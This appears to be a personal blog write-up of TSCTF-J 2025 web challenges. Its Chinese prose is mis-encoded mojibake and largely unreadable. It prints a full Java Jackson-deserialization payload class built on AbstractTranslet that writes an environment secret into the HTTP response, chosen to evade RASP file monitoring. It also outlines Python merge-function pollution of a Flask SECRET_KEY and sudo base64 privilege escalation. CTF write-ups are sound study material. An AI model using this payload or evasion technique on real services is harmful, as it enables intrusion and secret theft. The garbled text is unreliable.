[{"content":"2025 TSCTF-J è¥¿æŸšè¥¿æŸš/EZ_PY/äº‰æ¸¡ éš¾å¾—ä¸ç”¨å†™ä»¤äººæ±—é¢œçš„æ•°åˆ†ä½œä¸šï¼Œæ™šä¸ŠèŠ±ç‚¹æ—¶é—´æŠŠå‰©ä¸‹çš„é¢˜ç›®å†æ•´ç†å­¦ä¹ ä¸‹ ï¼šï¼‰\nè¥¿æŸšè¥¿æŸš è™½ç„¶æ˜¯Day1çš„é¢˜ç›®ï¼Œä½†æ˜¯å¡åœ¨å…¶ä»–é¢˜ç›®ä¸Šäº†æ²¡åšå®ƒï¼ˆ\né¦–å…ˆçœ‹çœ‹é¢˜å¹²ï¼šä»€ä¹ˆæ˜¯Jacksonï¼Ÿ\nâ€¦â€¦å¥½é—®é¢˜ï¼ æŸ¥äº†ä¸€ä¸‹ï¼ŒJacksonæ˜¯ä¸€ä¸ªç”¨äºJavaçš„JSONå¤„ç†åº“ï¼Œå¯ä»¥å°†Javaå¯¹è±¡åºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–å›Javaå¯¹è±¡ã€‚æ•…å¯ä»¥æ„é€ æ¶æ„Javaç±»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.PrintWriter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; public class Eshell extends AbstractTranslet { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } static { try { HttpServletRequest httpServletRequest = ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest(); HttpServletResponse httpServletResponse = ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getResponse(); // è¯»å–ç¯å¢ƒå˜é‡ flag String flag = System.getenv(\u0026#34;FLAG\u0026#34;); PrintWriter out = httpServletResponse.getWriter(); out.println(flag != null ? flag : \u0026#34;flag is not set\u0026#34;); out.flush(); out.close(); } catch (Exception e) { e.printStackTrace(); } } } è¯¦ç»†åˆ†æä¸€ä¸‹å®˜æ–¹ç»™å‡ºçš„Payloadä»£ç ï¼ˆå¦‚ä¸Šï¼‰\nåŒ…å¯¼å…¥éƒ¨åˆ†ï¼šéƒ¨åˆ†åŒ…çš„ä½œç”¨å¦‚ä¸‹ğŸ‘‡ åœ¨Line12å¤„ï¼Œå®šä¹‰äº†ä¸€ä¸ªç±»EShellæ¥ç»§æ‰¿AbstractTransletè¿™ä¸ªå…³é”®ç±»\nAbstractTransletæ˜¯Apache Xalan XSLTå¤„ç†å™¨çš„åŸºç¡€ç±»ï¼Œåœ¨Jacksonååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœç±»è·¯å¾„ä¸­æœ‰Xalanï¼Œå¯ä»¥è§¦å‘è¿™äº›ç±»çš„å®ä¾‹åŒ–ã€‚ ç´§æ¥ç€ï¼ŒLine14-18æ˜¯ä¸¤ä¸ªAbstractTransletçš„æŠ½è±¡æ–¹æ³•ï¼Œå¿…é¡»å®ç°ã€‚å› ä¸ºè¿™ä¸¤ä¸ªæ–¹æ³•çš„ä½œç”¨ä»…ä»…æ˜¯è®©ç±»èƒ½å¤Ÿæ­£å¸¸ç¼–è¯‘å’Œå®ä¾‹åŒ–ï¼Œæ‰€ä»¥æ–¹æ³•ä½“ä¸ºç©ºï¼ˆâ€œå½¢å¼ä¸»ä¹‰â€ï¼‰ Line20-Line37æ˜¯ä¸€ä¸ªé™æ€ä»£ç å—ï¼Œæ„é€ äº†æœ¬payloadçš„æ ¸å¿ƒæ¶æ„ä»£ç ï¼ Line22-Line23ä¸ºè·å–HTTPè¯·æ±‚å’Œå“åº”å¯¹è±¡ Line26ä¸ºè¯»å–ç¯å¢ƒå˜é‡flagï¼šhintæåˆ°å°è¯•ä¸ç”¨å‘½ä»¤ç›´æ¥è¯»å–ç¯å¢ƒå˜é‡ï¼ˆå®é™…ä¸Šæ˜¯ä¸ºäº†ç»•è¿‡RASPï¼‰ï¼Œæ‰€ä»¥æ²¡ç”¨new FileInputStream(\u0026quot;/flag\u0026quot;)ä»¥å…è§¦å‘æ–‡ä»¶è¯»å–ç›‘æ§ Line27-Line31ä¸ºè¾“å‡ºç»“æœflag å¦å¤–ï¼Œdsè¿˜ç»™å‡ºäº†ä¸€äº›å…³äºè¿™ä»½WPçš„ä»£ç é€‰æ‹©ç†ç”±ï¼š çœ‹æ¥å¾—æŠ½å‡ºæ—¶é—´å¥½å¥½å­¦å­¦Javaäº†ï¼ˆç¬‘ï¼‰\nEZ_PY ä»¤æˆ‘éå¸¸é—æ†¾çš„ä¸€é¢˜ï¼Œæœ€åä¸€å¤©ååœ¨ç”µè„‘å‰ä¸€æ™šä¸Šå¾ˆåç‰¢äº†ï¼ˆ\nå¤ç›˜ä¸‹æ¥ï¼Œæ˜¯fenjingä»£ç é”™äº†ï¼Œåœ¨ä¸æ–­çŒœflagè·¯å¾„ï¼Œè€Œä¸”WPä¸­è¿™éƒ¨åˆ†æˆ‘åœ¨å†™è„šæœ¬çš„æ—¶å€™è¯­æ³•å†™é”™äº†\nå…³äºfenjingä»£ç ä¹‹å‰çš„æ­¥éª¤ï¼Œæ¯”èµ›æ—¶æ˜¯ç”¨AI+CSDNæŠŠmergeå‡½æ•°çš„æ¼æ´ä¸€æŠŠæ¢­çš„ï¼ŒæŠŠSECRET_KEYç»™æ±¡æŸ“äº†ã€‚é¢è¯•é‚£å¤©å‘ç°è‡ªå·±å¯¹mergeå‡½æ•°çš„ç†è§£æœ‰é—®é¢˜ï¼ˆæ‚²ï¼‰ï¼Œé‚å­¦ä¹ ä¹‹\nè´´ä¸€ä¸‹åŸå‡½æ•°ï¼š\nmergeå‡½æ•°å¯ä»¥å°†ä¸€ä¸ªå­—å…¸çš„å†…å®¹åˆå¹¶åˆ°å¦ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œä¸ä»…èƒ½åˆå¹¶åˆ°å­—å…¸ï¼Œè¿˜èƒ½åˆå¹¶åˆ°ä»»ä½•Pythonå¯¹è±¡ã€‚\nforå¾ªç¯ä¼šéå†å­—å…¸srcä¸­çš„æ¯ä¸ªé”®å€¼å¯¹ï¼Œkä¸ºé”®ï¼ˆkeyï¼‰ï¼Œvä¸ºå€¼ï¼ˆvalueï¼‰ ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼šæ£€æŸ¥ç›®æ ‡æ˜¯å¦æ˜¯å­—å…¸ç±»å‹ã€‚å¦‚æœæ˜¯å­—å…¸ç±»å‹ï¼Œå·²å­˜åœ¨è¿™ä¸ªé”®ï¼Œä¸”å€¼ä¹Ÿæ˜¯å­—å…¸ï¼Œå°±é€’å½’è°ƒç”¨mergeå‡½æ•°ï¼Œç»§ç»­åˆå¹¶å†…å±‚çš„å­—å…¸ã€‚å¦‚æœä¸æ˜¯å­—å…¸ï¼Œæˆ–è€…ç›®æ ‡ä¸­æ²¡æœ‰è¿™ä¸ªé”®ï¼Œå°±ç›´æ¥ç”¨æºå€¼è¦†ç›–ç›®æ ‡å€¼ã€‚ å¦‚æœä¸æ˜¯å­—å…¸ç±»å‹ï¼Œä½†æ˜¯æœ‰åŒåå±æ€§kï¼Œä¸”æºå€¼væ˜¯å­—å…¸ï¼Œå°±é€’å½’åˆå¹¶åˆ°è¯¥å±æ€§ å¦‚æœä»¥ä¸Šæƒ…å†µéƒ½ä¸æ»¡è¶³ï¼Œå°±ç›´æ¥ç»™ç›®æ ‡å¯¹è±¡è®¾ç½®æ–°å±æ€§kï¼Œå€¼ä¸ºvã€‚\næ‰€ä»¥mergeå‡½æ•°å¯ä»¥æ·±åº¦åˆå¹¶å­—å…¸å’Œå¯¹è±¡å±æ€§ï¼Œå›åˆ°æ±¡æŸ“é“¾payloadï¼š\nå¤§è‡´æ˜¯è¿™æ ·ä¸€ä¸ªæ€è·¯ï¼š\nè¿™é‡Œçš„_init_çš„_globals_å±æ€§å¯ä»¥ä¿®æ”¹å½±å“æ•´ä¸ªæ¨¡å—ï¼Œä¸”Flaskçš„appé€šå¸¸åœ¨æ¨¡å—å…¨å±€å˜é‡ä¸­\näº‰æ¸¡ åšçš„æ—¶å€™å¡åœ¨flagçš„ææƒäº† æŸ¥è¯¢çŸ¥é“ï¼Œsudoï¼ˆSuperUser DOï¼‰æ˜¯Linux/Unixç³»ç»Ÿä¸­çš„ä¸€ä¸ªå‘½ä»¤ï¼Œå…è®¸æ™®é€šç”¨æˆ·ä»¥rootçš„æƒé™æ¥æ‰§è¡Œå‘½ä»¤ã€‚ ç”¨sudo -1æ£€æŸ¥sudoæƒé™\nNOPASSWDè¡¨æ˜ç”¨æˆ·www-dataå¯ä»¥æ— å¯†ç ä»¥rootæƒé™è¿è¡Œ/usr/bin/base64ï¼Œç”¨base64å°è¯•è¯»å–åå‘ç°æ— å›æ˜¾ï¼Œæ¥ä¸‹æ¥æŒ‰ç…§WPçš„æ­¥éª¤å³å¯\n","date":"2025-10-28T19:43:20+08:00","permalink":"https://theodorically.github.io/p/2025tsctf-j-web1/","title":"2025TSCTF-J web(1)"}]